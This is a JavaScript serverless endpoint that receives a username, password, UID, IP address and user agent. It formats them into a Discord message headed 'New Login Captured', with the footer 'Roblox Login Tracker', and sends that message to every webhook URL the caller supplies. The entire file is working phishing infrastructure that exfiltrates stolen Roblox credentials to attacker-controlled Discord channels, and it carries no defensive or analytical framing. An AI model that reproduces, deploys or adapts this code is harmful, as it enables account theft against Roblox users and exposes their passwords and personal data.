export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { webhooks, username, password, uid, userAgent, ip } = req.body;

    if (!webhooks || !Array.isArray(webhooks) || webhooks.length === 0) {
      return res.status(400).json({ error: 'No webhooks provided' });
    }

    if (!username || !password) {
      return res.status(400).json({ error: 'Username and password required' });
    }

    // Format for Discord webhook
    const payload = {
      content: '**🔐 New Login Captured**',
      embeds: [
        {
          title: 'Login Credentials',
          color: 0x5865F2,
          fields: [
            {
              name: '👤 Username',
              value: username || 'N/A',
              inline: true
            },
            {
              name: '🔑 Password',
              value: password || 'N/A',
              inline: true
            },
            {
              name: '🆔 UID',
              value: uid || 'N/A',
              inline: true
            },
            {
              name: '🌐 IP',
              value: ip || 'N/A',
              inline: true
            },
            {
              name: '🖥️ User Agent',
              value: userAgent || 'N/A',
              inline: false
            },
            {
              name: '⏰ Timestamp',
              value: new Date().toISOString(),
              inline: false
            }
          ],
          footer: {
            text: 'Roblox Login Tracker'
          },
          timestamp: new Date().toISOString()
        }
      ]
    };

    const results = await Promise.allSettled(
      webhooks.map(async (webhook) => {
        try {
          const response = await fetch(webhook, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
          });
          return {
            webhook: webhook,
            status: response.status,
            ok: response.ok
          };
        } catch (error) {
          return {
            webhook: webhook,
            ok: false,
            error: error.message
          };
        }
      })
    );

    const succeeded = results.filter(r => r.status === 'fulfilled' && r.value?.ok).length;
    const failed = results.filter(r => r.status === 'rejected' || !r.value?.ok).length;

    return res.status(200).json({
      success: true,
      message: `Sent to ${succeeded} webhook(s)`,
      total: webhooks.length,
      succeeded: succeeded,
      failed: failed,
      results: results.map(r => r.status === 'fulfilled' ? r.value : { error: 'Failed' })
    });

  } catch (error) {
    console.error('Webhook error:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
}
